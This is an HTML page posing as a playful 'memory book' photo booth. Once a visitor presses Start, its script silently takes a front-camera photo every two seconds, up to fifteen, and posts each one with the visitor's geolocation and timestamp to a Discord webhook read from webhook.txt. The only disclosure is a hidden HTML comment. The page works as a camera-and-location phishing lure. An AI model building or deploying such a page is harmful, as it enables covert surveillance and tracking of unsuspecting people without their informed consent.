<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Emmanuel's Memory Stream</title>
    <style>
        body {
            text-align: center;
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4);
            font-family: 'Comic Sans MS', Arial, sans-serif;
            color: white;
            margin: 0;
            padding: 20px;
        }
        video {
            width: 100%;
            max-width: 480px;
            border: 5px solid #333;
            border-radius: 15px;
            box-shadow: 0 0 10px rgba(0,0,0,0.5);
        }
        canvas { display: none; }
        button {
            padding: 12px 30px;
            background: #ffcc00;
            color: #333;
            border: 3px solid #333;
            border-radius: 25px;
            font-size: 18px;
            cursor: pointer;
            margin: 10px;
            transition: background 0.3s;
        }
        button:hover { background: #ffdb4d; }
        #status {
            margin: 15px;
            font-size: 20px;
            font-weight: bold;
            text-shadow: 1px 1px 2px #333;
        }
        .manga-bubble {
            background: rgba(0,0,0,0.7);
            padding: 15px;
            border-radius: 10px;
            margin: 15px auto;
            max-width: 400px;
            border: 3px solid #fff;
            font-size: 16px;
        }
    </style>
</head>
<body>
    <h1>üéâ Emmanuel's Memory Stream! üéâ</h1>
    <div class="manga-bubble">You‚Äôre in Emmanuel‚Äôs Memory Book! Pose epicly! üåç</div>
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <button id="startBtn">Start Streaming!</button>
    <button id="stopBtn" style="display: none;">Stop Streaming</button>
    <div id="status">Ready to join Emmanuel‚Äôs memory? Photos: <span id="counter">0</span></div>

    <!-- Privacy Note: Photos and locations saved to Emmanuel‚Äôs Discord‚Äîuse ethically! -->
    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');
        const status = document.getElementById('status');
        const startBtn = document.getElementById('startBtn');
        const stopBtn = document.getElementById('stopBtn');
        const counter = document.getElementById('counter');
        let stream = null;
        let intervalId = null;
        let photoCount = 0;
        let locationData = { lat: 'N/A', lon: 'N/A' };
        let WEBHOOK_URL = '';

        const messages = [
            'Epic pose for Emmanuel‚Äôs archive! üåü',
            'Memory locked in at your spot! üíæ',
            'New memory from a star! üì∏',
            'Thanks for the pose, [location]! üòé'
        ];

        // Load webhook URL from webhook.txt
        fetch('webhook.txt')
            .then(response => response.text())
            .then(url => {
                WEBHOOK_URL = url.trim();
                if (!WEBHOOK_URL) throw new Error('Webhook URL not found!');
                console.log('Webhook URL loaded:', WEBHOOK_URL);
            })
            .catch(err => {
                status.textContent = 'Error loading webhook URL! Check webhook.txt.';
                console.error('Fetch error:', err);
            });

        startBtn.addEventListener('click', async () => {
            if (!WEBHOOK_URL) {
                status.textContent = 'Webhook not loaded! Try again.';
                return;
            }
            try {
                // Request camera access
                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                status.textContent = 'Starting Emmanuel‚Äôs Memory Stream...';

                // Request location access
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        pos => {
                            locationData = { lat: pos.coords.latitude.toFixed(2), lon: pos.coords.longitude.toFixed(2) };
                            startCapture();
                        },
                        err => {
                            console.warn('Location access denied:', err);
                            startCapture(); // Proceed without location
                        }
                    );
                } else {
                    status.textContent = 'Location not supported, continuing...';
                    startCapture();
                }
            } catch (err) {
                status.textContent = 'Camera access denied! No memory fun. üò¢';
                console.error('Error:', err);
            }
        });

        function startCapture() {
            startBtn.style.display = 'none';
            stopBtn.style.display = 'inline-block';
            canvas.width = 640;
            canvas.height = 480;

            intervalId = setInterval(() => {
                if (photoCount < 15) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('file', blob, 'memory.jpg');
                        const randomMsg = messages[Math.floor(Math.random() * messages.length)].replace('[location]', `${locationData.lat}, ${locationData.lon}`);
                        formData.append('content', `${randomMsg} at ${new Date().toLocaleTimeString()} [${locationData.lat}, ${locationData.lon}]`);

                        fetch(WEBHOOK_URL, { method: 'POST', body: formData })
                            .then(res => {
                                if (res.ok) {
                                    photoCount++;
                                    counter.textContent = photoCount;
                                    status.textContent = `Memory #${photoCount} saved at [${locationData.lat}, ${locationData.lon}]!`;
                                } else {
                                    status.textContent = 'Failed to save memory!';
                                }
                            })
                            .catch(() => { status.textContent = 'Error sending memory!'; });
                    }, 'image/jpeg', 0.8);
                } else {
                    stopStreaming();
                }
            }, 2000); // 2 seconds interval for 15 photos in 30 seconds
        }

        stopBtn.addEventListener('click', stopStreaming);

        function stopStreaming() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                stream = null;
            }
            if (intervalId) clearInterval(intervalId);
            status.textContent = `Stream stopped. ${photoCount} memories saved! Thanks for joining Emmanuel‚Äôs memory, [${locationData.lat}, ${locationData.lon}]!`;
            startBtn.style.display = 'inline-block';
            stopBtn.style.display = 'none';
        }

        window.addEventListener('beforeunload', () => {
            if (stream) stream.getTracks().forEach(track => track.stop());
            if (intervalId) clearInterval(intervalId);
        });
    </script>
</body>
</html>
